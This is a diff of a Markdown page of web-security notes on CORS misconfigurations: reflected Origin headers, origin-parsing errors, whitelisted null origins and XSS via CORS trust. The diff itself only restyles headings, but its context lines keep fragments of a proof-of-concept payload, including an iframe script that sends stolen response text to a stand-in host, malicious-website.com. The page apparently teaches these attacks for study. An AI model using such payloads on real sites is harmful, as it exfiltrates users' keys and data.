@@ -96,9 +96,7 @@ Access-Control-Max-Age: 240
 
 </details>
 
-## <mark style="color:yellow;">Vulnerabilities</mark>
-
-**Server-generated ACAO header from client-specified Origin header**
+## <mark style="color:yellow;">**Server-generated ACAO header from client-specified Origin header**</mark>
 
 Some app read the Origin header from requests and including a response header stating that the requesting origin is allowed.
 
@@ -122,9 +120,7 @@ function reqListener() {
 </script>
 ```
 
-***
-
-**Errors parsing Origin headers**
+## <mark style="color:yellow;">**Errors parsing Origin headers**</mark>
 
 * Some apps enable access from various sources through a whitelist of permitted origins
 * Suppose `normal-website.com`
@@ -136,7 +132,7 @@ function reqListener() {
 
 ***
 
-**Whitelisted null origin value**
+## <mark style="color:yellow;">**Whitelisted null origin value**</mark>
 
 Detection
 
@@ -158,9 +154,7 @@ location='https://malicious-website.com/log?key='+this.responseText;
 </script>"></iframe>
 ```
 
-***
-
-#### Exploiting XSS via CORS trust relationships <a href="#exploiting-xss-via-cors-trust-relationships" id="exploiting-xss-via-cors-trust-relationships"></a>
+## <mark style="color:yellow;">Exploiting XSS via CORS trust relationships</mark> <a href="#exploiting-xss-via-cors-trust-relationships" id="exploiting-xss-via-cors-trust-relationships"></a>
 
 Suppose that:
 
